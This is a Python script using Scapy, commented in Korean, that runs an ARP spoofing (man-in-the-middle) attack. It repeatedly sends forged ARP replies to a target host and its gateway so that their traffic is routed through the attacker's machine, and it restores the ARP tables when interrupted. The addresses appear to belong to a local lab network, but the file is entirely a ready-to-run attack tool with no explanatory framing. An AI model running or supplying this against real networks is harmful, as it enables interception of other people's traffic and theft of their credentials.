from scapy.all import *
import time
import sys
import threading

# 공격자 IP와 MAC 주소
ATTACKER_IP = "10.9.0.2"
ATTACKER_MAC = "02:42:0a:09:00:02"

# 타겟 호스트 정보
TARGET_IP = "10.9.0.5"
TARGET_MAC = "02:42:0a:09:00:05"

# 게이트웨이 정보
GATEWAY_IP = "10.9.0.1"
GATEWAY_MAC = "02:42:0a:09:00:01"

def spoof(target_ip, target_mac, gateway_ip, gateway_mac):
    """
    ARP Spoofing 공격을 수행합니다.
    """
    try:
        while True:
            # 타겟 호스트에게 게이트웨이의 IP는 공격자의 MAC이라는 ARP 패킷 전송
            spoofed_packet = ARP(
                op=2,  # ARP Reply
                psrc=gateway_ip,  # Source IP (게이트웨이 IP)
                hwsrc=ATTACKER_MAC,  # Source MAC (공격자 MAC)
                pdst=target_ip,  # Destination IP (타겟 IP)
                hwdst=target_mac  # Destination MAC (타겟 MAC)
            )
            
            send(spoofed_packet, verbose=False)
            print(f"[*] Sent ARP spoof packet to {target_ip} ({target_mac})")
            
            # 게이트웨이에게 타겟 호스트의 IP는 공격자의 MAC이라는 ARP 패킷 전송
            spoofed_packet = ARP(
                op=2,
                psrc=target_ip,
                hwsrc=ATTACKER_MAC,
                pdst=gateway_ip,
                hwdst=gateway_mac
            )
            
            send(spoofed_packet, verbose=False)
            print(f"[*] Sent ARP spoof packet to {gateway_ip} ({gateway_mac})")
            
            time.sleep(2)  # 2초 간격으로 패킷 전송
            
    except KeyboardInterrupt:
        print("\n[*] Stopping ARP spoofing...")
        # 공격 중단 시 ARP 테이블 복구
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    """
    ARP 테이블을 원래 상태로 복구합니다.
    """
    packet = ARP(
        op=2,
        psrc=source_ip,
        hwsrc=source_mac,
        pdst=target_ip,
        hwdst=target_mac
    )
    send(packet, count=5, verbose=False)
    print(f"[*] ARP table restored for {target_ip}")

def main():
    os.system("clear")
    print("[*] Starting ARP Spoofing Attack...")
    print(f"[*] Target: {TARGET_IP} ({TARGET_MAC})")
    print(f"[*] Gateway: {GATEWAY_IP} ({GATEWAY_MAC})")
    print(f"[*] Attacker: {ATTACKER_IP} ({ATTACKER_MAC})")
    
    # ARP Spoofing 공격 시작
    spoof(TARGET_IP, TARGET_MAC, GATEWAY_IP, GATEWAY_MAC)

if __name__ == "__main__":
    main()
